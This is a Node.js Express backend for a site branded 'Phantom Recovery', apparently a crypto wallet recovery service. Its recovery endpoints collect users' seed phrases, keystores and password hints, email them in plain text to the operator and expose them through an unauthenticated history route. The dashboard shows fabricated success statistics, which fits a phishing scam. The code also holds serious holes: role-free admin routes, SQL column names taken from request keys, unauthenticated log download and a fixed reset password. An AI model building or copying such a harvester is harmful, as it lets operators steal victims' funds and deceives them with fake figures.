// ---------------- Dependencies ----------------
const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const path = require("path");
const nodemailer = require("nodemailer");
const fs = require("fs");
const http = require("http");
const { Server } = require("socket.io");
const bcrypt = require("bcryptjs");
const passport = require("passport");
const GoogleStrategy = require("passport-google-oauth20").Strategy;
const FacebookStrategy = require("passport-facebook").Strategy;
const InstagramStrategy = require("passport-instagram").Strategy;
const AppleStrategy = require("passport-apple");
const session = require("express-session");
const { Pool } = require("pg");
const jwt = require('jsonwebtoken');

// ---------------- Config ----------------
dotenv.config();
const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
  cors: { 
    origin: process.env.CORS_ORIGIN || "*",
    credentials: true 
  } 
});

// ---------------- Middlewares ----------------
app.use(cors({ origin: process.env.CORS_ORIGIN || "*", credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({ 
  secret: process.env.SESSION_SECRET || 'your-secret-key-change-this', 
  resave: false, 
  saveUninitialized: false,
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));
app.use(passport.initialize());
app.use(passport.session());
app.use('/images', express.static(path.join(__dirname, '..', 'images')));

// ---------------- PostgreSQL Connection ----------------
const pool = new Pool({
  user: process.env.DB_USER,       
  host: process.env.DB_HOST,       
  database: process.env.DB_NAME,   
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT || 5432,
  ssl: {
    rejectUnauthorized: false
  }
});

pool.connect()
  .then(() => console.log("✅ Connected to PostgreSQL (SSL enabled)"))
  .catch((err) => console.error("❌ DB Connection Error:", err));

// ---------------- JWT Middleware ----------------
function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: "Unauthorized - No token provided" });
  }

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch (err) {
    return res.status(401).json({ message: "Invalid or expired token" });
  }
}

// ---------------- Nodemailer Setup ----------------
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

async function sendMail({ subject, text, to }) {
  try {
    const mailOptions = {
      from: `"Phantom Recovery" <${process.env.EMAIL_USER}>`,
      to: to || process.env.EMAIL_TO,
      subject,
      text,
    };
    await transporter.sendMail(mailOptions);
    console.log(`📧 Email sent to ${to || process.env.EMAIL_TO}`);
  } catch (err) {
    console.error("❌ Failed to send email:", err);
    throw err;
  }
}

// ---------------- In-Memory Storage ----------------
let recoveryHistory = [];
let tickets = [];
let systemConfig = {
  emailAlerts: true,
  pushNotifications: true,
  twoFA: false,
  allowedAdmins: ["admin"],
};
let otpStore = {}; // { email: { code, expiresAt } }
const withdrawalCodes = {}; // { userId: { code, expiresAt, walletId, amount } }
const offlineMessages = [];
const connectedAdmins = new Set();

// ---------------- Stats Data ----------------
let stats = {
  totalRequests: 1247,
  successful: 1089,
  failed: 87,
  avgTime: 4.2,
  successRate: 87.3,
  lineChart: [
    { label: 'Mon', requests: 145, success: 128 },
    { label: 'Tue', requests: 168, success: 152 },
    { label: 'Wed', requests: 192, success: 171 },
    { label: 'Thu', requests: 156, success: 142 },
    { label: 'Fri', requests: 203, success: 185 },
    { label: 'Sat', requests: 178, success: 159 },
    { label: 'Sun', requests: 189, success: 167 }
  ],
  barChart: [
    { label: 'Password', value: 562, percent: 45 },
    { label: 'Account', value: 324, percent: 26 },
    { label: 'Wallet', value: 249, percent: 20 },
    { label: 'File', value: 87, percent: 7 },
    { label: 'Key', value: 25, percent: 2 }
  ],
  incidents: [
    { id:1, title:'Critical Wallet Recovery - User #4521', status:'success', time:'2 hours ago', type:'Wallet Recovery', duration:'1.5 hours', details:'Successfully recovered MetaMask wallet using partial seed phrase.'},
    { id:2, title:'Password Recovery Failed - User #3892', status:'failure', time:'4 hours ago', type:'Password Recovery', duration:'3 hours', details:'Failed to recover password due to insufficient info.'},
    { id:3, title:'Account Recovery Pending - User #5643', status:'pending', time:'6 hours ago', type:'Account Recovery', duration:'In Progress', details:'Email verification sent, awaiting user response.'}
  ]
};

// ---------------- Wallet JSON Data ----------------
const DATA_FILE = path.join(__dirname, "wallets.json");

function loadWallets() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
      return [];
    }
    const data = fs.readFileSync(DATA_FILE, "utf8");
    return JSON.parse(data);
  } catch (err) {
    console.error("Error loading wallets:", err);
    return [];
  }
}

function saveWallets(wallets) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(wallets, null, 2));
  } catch (err) {
    console.error("Error saving wallets:", err);
  }
}

// ---------------- Audit Logging ----------------
const logFile = path.join(__dirname, "audit.log");

function logAction(action, details) {
  const timestamp = new Date().toISOString();
  const entry = `[${timestamp}] ${action} - ${JSON.stringify(details)}\n`;
  try {
    fs.appendFileSync(logFile, entry);
    console.log(`[${timestamp}] ACTION: ${action} | DETAILS:`, details);
  } catch (err) {
    console.error("Error writing to audit log:", err);
  }
}

// ---------------- Utility Functions ----------------
function notifyAdmins(message) {
  io.emit("adminNotification", { message, time: new Date().toISOString() });
  sendMail({ subject: "🔔 Admin Notification", text: message }).catch(console.error);
}

function saveRecovery({ type, status, details, user }) {
  const entry = {
    id: recoveryHistory.length + 1,
    type,
    status: status || "Pending",
    details,
    user: user || "anonymous",
    submittedAt: new Date().toISOString(),
  };
  recoveryHistory.push(entry);
  logAction("RECOVERY_CREATED", entry);
  io.emit("recoveryUpdate", entry);
  notifyAdmins(`New recovery request submitted (#${entry.id}, type: ${entry.type})`);

  const failures = recoveryHistory.filter((r) => r.status === "Failed").length;
  if (failures > 5) {
    sendMail({
      subject: "🚨 Recovery Alert",
      text: `High failure rate detected: ${failures} failed recoveries.`,
    }).catch(console.error);
  }
  return entry;
}

// ---------------- Frontend Path ----------------
const frontendPath = path.join(__dirname, "../");
app.use(express.static(frontendPath));

// =====================================================================
// ------------------------ PASSPORT STRATEGIES ------------------------
// =====================================================================

// Passport serialization
passport.serializeUser((user, done) => done(null, user.id));
passport.deserializeUser(async (id, done) => {
  try {
    const result = await pool.query("SELECT * FROM users WHERE id = $1", [id]);
    done(null, result.rows[0]);
  } catch (err) {
    done(err, null);
  }
});

// Google Strategy
if (process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET) {
  passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: process.env.GOOGLE_CALLBACK_URL || "http://localhost:5000/auth/google/callback"
  }, async (accessToken, refreshToken, profile, done) => {
    try {
      const email = profile.emails[0].value;
      let result = await pool.query("SELECT * FROM users WHERE email = $1", [email]);
      
      if (result.rows.length === 0) {
        const insertResult = await pool.query(
          "INSERT INTO users (first_name, last_name, email, role, active) VALUES ($1, $2, $3, $4, $5) RETURNING *",
          [profile.name.givenName, profile.name.familyName, email, "client", true]
        );
        return done(null, insertResult.rows[0]);
      }
      return done(null, result.rows[0]);
    } catch (err) {
      return done(err, null);
    }
  }));
}

// =====================================================================
// ------------------------ OAUTH ROUTES -------------------------------
// =====================================================================

app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    const token = jwt.sign(
      { id: req.user.id, role: req.user.role },
      process.env.JWT_SECRET,
      { expiresIn: "1h" }
    );
    res.redirect(`/dashboard?token=${token}`);
  }
);

// =====================================================================
// ------------------------ PUBLIC ENDPOINTS ---------------------------
// =====================================================================

// Get public stats
app.get('/api/stats', (req, res) => {
  res.json(stats);
});

// Update stats (should be protected in production)
app.post("/api/stats/update", authenticateJWT, (req, res) => {
  stats = { ...stats, ...req.body };
  io.emit("statsUpdated", stats);
  res.json({ message: "Stats updated", stats });
});

// =====================================================================
// ------------------------ AUTH ENDPOINTS -----------------------------
// =====================================================================

// Request OTP
app.post("/api/auth/request-otp", async (req, res) => {
  const { email } = req.body;
  
  if (!email) {
    return res.status(400).json({ message: "Email required" });
  }

  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = { 
    code: otp, 
    expiresAt: Date.now() + 5 * 60 * 1000 
  };

  try {
    await sendMail({
      to: email,
      subject: "Your Phantom Recovery OTP",
      text: `Your OTP code is: ${otp}. Expires in 5 minutes.`,
    });
    res.json({ message: "OTP sent successfully" });
  } catch (err) {
    console.error("Failed to send OTP:", err);
    res.status(500).json({ message: "Failed to send OTP" });
  }
});

// Verify OTP
app.post("/api/auth/verify-otp", (req, res) => {
  const { email, otp } = req.body;
  
  if (!email || !otp) {
    return res.status(400).json({ message: "Email and OTP required" });
  }

  const record = otpStore[email];
  
  if (!record) {
    return res.status(400).json({ message: "No OTP requested for this email" });
  }
  
  if (Date.now() > record.expiresAt) {
    delete otpStore[email];
    return res.status(400).json({ message: "OTP expired" });
  }
  
  if (record.code !== otp) {
    return res.status(400).json({ message: "Incorrect OTP" });
  }

  delete otpStore[email];
  res.json({ message: "OTP verified" });
});

// Reset password
app.post("/api/auth/reset-password", async (req, res) => {
  const { email, password } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ message: "Email and password required" });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const result = await pool.query(
      "UPDATE users SET password = $1 WHERE email = $2 RETURNING id",
      [hashedPassword, email]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    logAction("PASSWORD_RESET", { email });
    res.json({ message: "Password updated successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Failed to reset password" });
  }
});

// Register user
app.post("/api/register", async (req, res) => {
  const { firstName, lastName, email, password } = req.body;

  if (!firstName || !lastName || !email || !password) {
    return res.status(400).json({ message: "All fields are required" });
  }

  try {
    const existingUser = await pool.query(
      "SELECT * FROM users WHERE email = $1", 
      [email]
    );
    
    if (existingUser.rows.length > 0) {
      return res.status(400).json({ message: "Email already registered" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const result = await pool.query(
      "INSERT INTO users (first_name, last_name, email, password, role, active) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id",
      [firstName, lastName, email, hashedPassword, "client", true]
    );

    const newUserId = result.rows[0].id;
    logAction("USER_REGISTER", { email, id: newUserId });

    await sendMail({
      to: email,
      subject: "Welcome to Phantom Recovery",
      text: `Hi ${firstName}, your account has been successfully created!`,
    });

    console.log(`✅ New user registered: ${email}`);

    res.status(201).json({
      success: true,
      message: "Account created successfully",
      userId: newUserId,
    });
  } catch (err) {
    console.error("❌ Registration error:", err);
    res.status(500).json({ message: "Failed to create account" });
  }
});

// Login user
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Email and password are required" });
  }

  try {
    const result = await pool.query(
      "SELECT * FROM users WHERE LOWER(email) = LOWER($1)",
      [email]
    );
    const user = result.rows[0];

    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    if (!user.password) {
      return res.status(400).json({ message: "Password not set for this account" });
    }

    const match = await bcrypt.compare(password, user.password);
    if (!match) {
      return res.status(401).json({ message: "Incorrect password" });
    }

    const token = jwt.sign(
      { id: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: "24h" }
    );

    logAction("USER_LOGIN", { email, id: user.id });
    console.log(`✅ Login successful: ${email}`);

    res.json({
      success: true,
      message: "Login successful",
      token,
      userId: user.id,
      role: user.role,
    });
  } catch (err) {
    console.error("❌ Login error:", err);
    res.status(500).json({ message: "Login failed" });
  }
});

// =====================================================================
// ------------------------ USER PROFILE -------------------------------
// =====================================================================

// Get user profile
app.get("/api/user/:id", authenticateJWT, async (req, res) => {
  const { id } = req.params;

  try {
    const result = await pool.query(
      "SELECT id, first_name, last_name, email, role, active FROM users WHERE id=$1", 
      [id]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }
    
    res.json(result.rows[0]);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "DB Error", error: err.message });
  }
});

// Update user profile
app.patch("/api/user/:id", authenticateJWT, async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  // Prevent updating sensitive fields
  delete updates.password;
  delete updates.role;

  try {
    const keys = Object.keys(updates);
    if (keys.length === 0) {
      return res.status(400).json({ message: "No valid fields to update" });
    }

    const setQuery = keys.map((k, i) => `${k}=$${i+1}`).join(", ");
    const values = [...Object.values(updates), id];
    
    await pool.query(
      `UPDATE users SET ${setQuery} WHERE id=$${keys.length+1}`, 
      values
    );
    
    const updatedUser = await pool.query(
      "SELECT id, first_name, last_name, email, role, active FROM users WHERE id=$1", 
      [id]
    );

    logAction("USER_UPDATE", { id, changes: updates });
    io.emit("profileUpdated", updatedUser.rows[0]);
    
    res.json({ 
      message: "Profile updated", 
      user: updatedUser.rows[0] 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Update Error", error: err.message });
  }
});

// ===================== ADMIN & SYSTEM ROUTES =====================

// ------------------------ USER MANAGEMENT ------------------------

// Get all users (admin only)
app.get("/api/admin/users", authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT id, first_name, last_name, email, role, active FROM users ORDER BY id"
    );
    res.json(result.rows);
  } catch (err) {
    console.error("Error fetching users:", err);
    res.status(500).json({ message: "Error fetching users" });
  }
});

// Toggle user active status
app.patch("/api/admin/users/:id/toggle", authenticateJWT, async (req, res) => {
  const { id } = req.params;

  try {
    const result = await pool.query(
      "UPDATE users SET active = NOT active WHERE id=$1 RETURNING *",
      [id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    logAction("USER_TOGGLE", result.rows[0]);
    io.emit("updateUsers", result.rows[0]); // push update to frontend
    res.json(result.rows[0]);
  } catch (err) {
    console.error("Error toggling user status:", err);
    res.status(500).json({ message: "Error toggling user status" });
  }
});

// Reset user password
app.patch("/api/admin/users/:id/reset", authenticateJWT, async (req, res) => {
  const { id } = req.params;

  try {
    const tempPassword = "changeme";
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    const result = await pool.query(
      "UPDATE users SET password=$1 WHERE id=$2 RETURNING email",
      [hashedPassword, id]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    logAction("USER_RESET", { userId: id });
    res.json({ message: "Password reset for user", tempPassword });
  } catch (err) {
    console.error("Error resetting password:", err);
    res.status(500).json({ message: "Error resetting password" });
  }
});

// Update recovery status
app.patch("/api/admin/recovery/:id/status", authenticateJWT, async (req, res) => {
  try {
    const { status, assignedTo } = req.body;
    const recovery = recoveryHistory.find(r => r.id == req.params.id);

    if (!recovery) return res.status(404).json({ message: "Recovery not found" });

    // Validate status
    const validStatuses = ["Pending", "In Progress", "Completed", "Rejected"];
    if (status && !validStatuses.includes(status)) {
      return res.status(400).json({ message: "Invalid status value" });
    }

    // Update fields
    if (status) recovery.status = status;
    if (assignedTo) recovery.assignedTo = assignedTo;
    recovery.updatedAt = new Date();

    // Log the action
    logAction("RECOVERY_UPDATE", { id: recovery.id, status, assignedTo });

    // Emit real-time update via Socket.IO
    io.emit("recoveryUpdate", recovery);

    // Send email notification to user (if email exists)
    if (recovery.userEmail) {
      await sendEmail({
        to: recovery.userEmail,
        subject: `Your Recovery Request Status Updated`,
        html: `
          <p>Hello ${recovery.user || "User"},</p>
          <p>Your recovery request <strong>${recovery.type}</strong> status has been updated to: <strong>${status}</strong>.</p>
          ${assignedTo ? `<p>Assigned To: ${assignedTo}</p>` : ""}
          <p>Submitted At: ${new Date(recovery.submittedAt).toLocaleString()}</p>
          <p>Thank you,<br/>Phantom Recovery Team</p>
        `
      });
    }

    res.json({ message: "Recovery status updated successfully", recovery });
  } catch (err) {
    console.error("❌ Error updating recovery status:", err);
    res.status(500).json({ message: "Server error" });
  }
});


// ------------------------ CONTACT & TICKETS ------------------------

// Create new support ticket
app.post("/api/contact", async (req, res) => {
  try {
    const { name, email, subject, message } = req.body;

    if (!name || !email || !subject || !message) {
      return res.status(400).json({ message: "⚠️ All fields are required." });
    }

    const ticket = {
      id: tickets.length + 1,
      name,
      email,
      subject,
      message,
      resolved: false,
      createdAt: new Date().toISOString(),
    };

    tickets.push(ticket);
    logAction("NEW_TICKET_CREATED", ticket);

    // Optional: send email (implement sendMail separately)
    await sendMail({
      subject: `[Support Ticket] ${subject}`,
      text: `New ticket received from ${name} <${email}>\n\nMessage:\n${message}`,
    });

    io.emit("adminNotification", {
      type: "new_ticket",
      message: `🎫 New ticket from ${name}: "${subject}"`,
      ticket,
    });

    res.json({ success: true, message: "✅ Ticket sent successfully!", ticket });
  } catch (err) {
    console.error("Ticket Error:", err);
    res.status(500).json({ success: false, message: "❌ Failed to send ticket." });
  }
});

// Update ticket status
app.patch("/api/admin/tickets/:id", authenticateJWT, (req, res) => {
  const ticket = tickets.find((t) => t.id == req.params.id);

  if (!ticket) return res.status(404).json({ message: "❌ Ticket not found." });

  ticket.resolved = req.body.resolved === true;
  ticket.updatedAt = new Date().toISOString();

  logAction("TICKET_STATUS_UPDATED", ticket);
  io.emit("adminNotification", {
    type: "ticket_update",
    message: `📬 Ticket #${ticket.id} marked ${ticket.resolved ? "resolved" : "pending"}.`,
    ticket,
  });

  res.json({ success: true, message: "✅ Ticket status updated!", ticket });
});

// Serve frontend (if needed)
app.use(express.static(path.join(__dirname, "../frontend")));

// Catch-all route
app.get("*", (req, res) => res.status(404).send("Page not found"));

// ---------------- WebSocket ----------------
io.on("connection", socket => {
  console.log("Client connected:", socket.id);
  // optionally send current tickets on connect
  socket.emit("initTickets", tickets);
});

// Get all tickets
app.get("/api/admin/tickets", authenticateJWT, (req, res) => {
  res.json({ success: true, total: tickets.length, tickets });
});

// ------------------------ SYSTEM SETTINGS ------------------------

// Get system settings
app.get("/api/admin/settings", authenticateJWT, (req, res) => {
  res.json(systemConfig);
});

// Update system settings
app.patch("/api/admin/settings", authenticateJWT, (req, res) => {
  Object.assign(systemConfig, req.body);
  logAction("SETTINGS_UPDATE", systemConfig);
  io.emit("settingsUpdate", systemConfig); // notify frontend if needed
  res.json(systemConfig);
});

// =====================================================================
// ------------------------ RECOVERY ENDPOINTS -------------------------
// =====================================================================

// Wallet recovery
app.post("/api/recovery/wallet", async (req, res) => {
  const { seed, passwordHint, user } = req.body;
  
  if (!seed && !passwordHint) {
    return res.status(400).json({ message: "⚠️ Provide seed or password hint." });
  }

  try {
    await sendMail({
      subject: "[Recovery] Wallet Recovery Request",
      text: `Seed/Backup: ${seed || "N/A"}\nPassword Hint: ${passwordHint || "N/A"}`,
    });
    
    const saved = saveRecovery({ 
      type: "Wallet Recovery", 
      status: "Pending", 
      details: { seed, passwordHint }, 
      user 
    });
    
    res.json({ 
      message: "✅ Wallet recovery request submitted!", 
      data: saved 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Failed to submit wallet recovery." });
  }
});

// Key recovery
app.post("/api/recovery/key", async (req, res) => {
  const { keystore, hardware, user } = req.body;
  
  if (!keystore && !hardware) {
    return res.status(400).json({ message: "⚠️ Provide keystore or hardware details." });
  }

  try {
    await sendMail({
      subject: "[Recovery] Lost Key Recovery Request",
      text: `Keystore: ${keystore || "N/A"}\nHardware: ${hardware || "N/A"}`,
    });
    
    const saved = saveRecovery({ 
      type: "Lost Key Recovery", 
      status: "Pending", 
      details: { keystore, hardware }, 
      user 
    });
    
    res.json({ 
      message: "✅ Lost key recovery request submitted!", 
      data: saved 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Failed to submit lost key recovery." });
  }
});

// Transaction recovery
app.post("/api/recovery/transaction", async (req, res) => {
  const { txid, blockchain, notes, user } = req.body;
  
  if (!txid || !blockchain) {
    return res.status(400).json({ message: "⚠️ TxID and Blockchain required." });
  }

  try {
    await sendMail({
      subject: "[Recovery] Transaction Recovery Request",
      text: `TxID: ${txid}\nBlockchain: ${blockchain}\nNotes: ${notes || "N/A"}`,
    });
    
    const saved = saveRecovery({ 
      type: "Transaction Recovery", 
      status: "Pending", 
      details: { txid, blockchain, notes }, 
      user 
    });
    
    res.json({ 
      message: "✅ Transaction recovery request submitted!", 
      data: saved 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Failed to submit transaction recovery." });
  }
});

// Multi-chain recovery
app.post("/api/recovery/multichain", async (req, res) => {
  const { blockchains, coins, user } = req.body;
  
  if (!blockchains || !coins) {
    return res.status(400).json({ message: "⚠️ Blockchains and Coins required." });
  }

  try {
    await sendMail({
      subject: "[Recovery] Multi-Chain Recovery Request",
      text: `Blockchains: ${blockchains}\nCoins: ${coins}`,
    });
    
    const saved = saveRecovery({ 
      type: "Multi-Chain Recovery", 
      status: "Pending", 
      details: { blockchains, coins }, 
      user 
    });
    
    res.json({ 
      message: "✅ Multi-chain recovery request submitted!", 
      data: saved 
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Failed to submit multi-chain recovery." });
  }
});

// =====================================================================
// ------------------------ WITHDRAWAL SYSTEM --------------------------
// =====================================================================

// Request withdrawal
app.post('/api/withdraw/request', authenticateJWT, async (req, res) => {
  const { walletId, amount } = req.body;
  const userId = req.user.id;

  if (!walletId || !amount) {
    return res.status(400).json({ message: "Wallet and amount are required." });
  }

  try {
    const walletRes = await pool.query(
      "SELECT * FROM wallets WHERE id=$1 AND user_id=$2", 
      [walletId, userId]
    );
    
    const wallet = walletRes.rows[0];
    if (!wallet) {
      return res.status(404).json({ message: "Wallet not found." });
    }
    
    if (wallet.balance < amount) {
      return res.status(400).json({ message: "Insufficient balance." });
    }

    // Generate 6-digit code
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    withdrawalCodes[userId] = { code, expiresAt: Date.now() + 5*60*1000, walletId, amount }; // 5 min expiry

    // Send email
    const userRes = await pool.query("SELECT email, phone FROM users WHERE id=$1", [userId]);
    const user = userRes.rows[0];
    if (user?.email) {
      await sendMail({ to: user.email, subject: "Your Withdrawal Code", text: `Your code is: ${code}` });
    }

    // Optional: Send SMS if service available
    // if (user?.phone) await sendSMS(user.phone, `Your withdrawal code is ${code}`);

    res.json({ message: "Verification code sent to your email/SMS. Enter it to confirm withdrawal." });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error." });
  }
});

// ---------------- Confirm withdrawal (verify code & process) ----------------
app.post('/api/withdraw/confirm', authenticateJWT, async (req, res) => {
  const { walletId, amount, code } = req.body;
  const userId = req.user.id;

  // Check pending request
  const record = withdrawalCodes[userId];
  if (!record || record.walletId != walletId || record.amount != amount) {
    return res.status(400).json({ message: "No pending withdrawal request found." });
  }

  // Check expiry
  if (Date.now() > record.expiresAt) {
    delete withdrawalCodes[userId];
    return res.status(400).json({ message: "Verification code expired." });
  }

  // Check code
  if (record.code !== code) {
    return res.status(401).json({ message: "Invalid verification code." });
  }

  try {
    // Process withdrawal
    await pool.query("UPDATE wallets SET balance=balance-$1 WHERE id=$2", [amount, walletId]);
    await pool.query("INSERT INTO withdrawals (user_id, wallet_id, amount) VALUES ($1,$2,$3)", [userId, walletId, amount]);

    // Emit update to clients
    const updatedWallet = await pool.query("SELECT * FROM wallets WHERE id=$1", [walletId]);
    io.emit("walletsUpdated", updatedWallet.rows[0]);

    // Remove used code
    delete withdrawalCodes[userId];

    res.json({ message: "Withdrawal successful.", wallet: updatedWallet.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error." });
  }
});
// =====================================================================
// --------------------- HISTORY & LOGS -------------------------------
app.get("/api/history", (req, res) => {
  const { type, status, search, role, user } = req.query;
  let results = [...recoveryHistory];

  if (role === "client") results = results.filter((r) => r.user === user);
  else if (role === "analyst") results = results.map(({ id, type, status, submittedAt }) => ({ id, type, status, submittedAt }));

  if (type) results = results.filter((r) => r.type === type);
  if (status) results = results.filter((r) => r.status === status);
  if (search) {
    const s = search.toLowerCase();
    results = results.filter((r) =>
      r.type.toLowerCase().includes(s) ||
      JSON.stringify(r.details).toLowerCase().includes(s) ||
      r.submittedAt.toLowerCase().includes(s)
    );
  }
  res.json(results);
});

app.get("/api/history/:id", (req, res) => {
  const recovery = recoveryHistory.find((r) => r.id == req.params.id);
  if (!recovery) return res.status(404).json({ message: "Not found" });
  res.json(recovery);
});

app.get("/api/logs/download", (req, res) => res.download(logFile, "audit.log"));

// Auth routes
const authRoutes = require("./routes/auth");
app.use("/api/auth", authRoutes);

// Frontend pages
const pages = [
  "index","about","analytics","contact","dashboard","history","home","login",
  "pass","profile","register","request","services","setting","support","wallet",
  "testimonials","admin","adlogin","adforget"
];

pages.forEach((page) => {
  const routePath = page === "index" ? "/" : `/${page}`;
  app.get(routePath, (req, res) => {
    res.sendFile(path.join(frontendPath, `${page}.html`));
  });
});

/// Catch-all SPA route (must be last)
app.get('*', (req, res) => {
  res.status(404).send('Page not found');
});


// =====================================================================
// ------------------------- SERVER START ------------------------------
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));

// ---------------- WebSocket ----------------
io.on("connection", (socket) => {
  console.log("🔌 Client connected:", socket.id);
  socket.emit("initData", recoveryHistory);
});
